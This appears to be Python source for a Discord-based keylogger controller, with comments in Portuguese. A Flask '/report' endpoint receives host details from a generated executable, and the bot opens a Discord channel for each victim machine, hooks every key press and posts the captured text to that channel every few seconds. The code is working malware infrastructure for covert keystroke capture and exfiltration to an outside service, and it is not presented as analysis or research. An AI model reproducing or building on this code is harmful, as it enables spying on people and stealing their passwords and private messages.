import discord
from discord.ext import commands
import keyboard, threading, asyncio
from acentos import CatalogoAcentos
from maquina import Maquina

@commands.command()
async def dev(ctx):
    await ctx.send("👨‍💻 O bot está ativo e pronto! 🚀")

class LoggerBot:
    
    def __init__(self, token: str, guild_id: int, main_id: str = None):
        self.token = token
        self.guild_id = guild_id
        self.main_id = main_id
        self.buffer = ""
        self.timer = None
        self.catalogo = CatalogoAcentos()
        self.maquina = Maquina()

        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix="!", intents=intents)

        # guarda o loop atual para uso seguro
        self.loop_ref = None
        asyncio.set_event_loop(self.loop_ref)

        self.bot.event(self.on_ready)
        self.bot.add_command(dev)

    async def on_ready(self):
        print(f"✅ Bot conectado como {self.bot.user}")
        self.loop_ref = asyncio.get_running_loop()  # pega o loop real do bot

        guild = self.bot.get_guild(self.guild_id)
        if self.main_id:
            status_channel = discord.utils.get(guild.text_channels, name="launcher-status")
            if status_channel is None:
                status_channel = await guild.create_text_channel("launcher-status")
            await status_channel.send(f"✅ Executável gerado com ID `{self.main_id}`. Aguardando inicialização...")

    async def avisar_execucao(self, main_id: str):
        """Avisar no Discord que um executável foi gerado e está aguardando inicialização."""
        guild = self.bot.get_guild(self.guild_id)
        if guild:
            channel = discord.utils.get(guild.text_channels, name="launcher-status")
            if channel is None:
                channel = await guild.create_text_channel("launcher-status")

            await channel.send(f"✅ Executável gerado com ID `{main_id}`. Aguardando inicialização...")

    async def criar_canal_remoto(self, dados: dict):
        guild = self.bot.get_guild(self.guild_id)
        if guild:
            nome_maquina = dados["hostname"].lower().replace(" ", "-")
            channel = discord.utils.get(guild.text_channels, name=nome_maquina)
            if channel is None:
                channel = await guild.create_text_channel(nome_maquina)

            mensagem = (
                f"🚀 Main_ID={dados['main_id']} iniciado\n"
                f"🖥️ SO: {dados['so']}\n"
                f"👤 Usuário: {dados['usuario']}\n"
                f"🕒 Iniciado em: {dados['inicio']}"
            )
            await channel.send(mensagem)

            # 🔑 inicia captura de teclas da máquina remota
            keyboard.on_press(lambda event: self.on_key(event, channel))

    def reset_timer(self, channel):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(3.0, lambda: self.enviar_buffer(channel))
        self.timer.start()

    def enviar_buffer(self, channel):
        if self.buffer.strip():
            texto = self.catalogo.normalizar(self.buffer)
            asyncio.run_coroutine_threadsafe(
                channel.send(f"🖊️ Texto digitado: {texto}"),
                self.loop_ref   # usa o loop guardado
            )
            self.buffer = ""

    def on_key(self, event, channel):
        if event.name == "backspace":
            self.buffer = self.buffer[:-1]
        elif event.name == "space":
            self.buffer += " "
        elif len(event.name) == 1:
            self.buffer += event.name
        self.reset_timer(channel)

    def run(self):
        self.bot.run(self.token)

# --- Servidor Flask para receber dados do .exe ---
from flask import Flask, request

app = Flask(__name__)
bot_instance = None  # será preenchido pelo launcher

@app.route("/report", methods=["POST"])
def report():
    dados = request.json
    asyncio.run_coroutine_threadsafe(
        bot_instance.criar_canal_remoto(dados),
        bot_instance.loop_ref   # usa o loop guardado
    )
    return {"status": "ok"}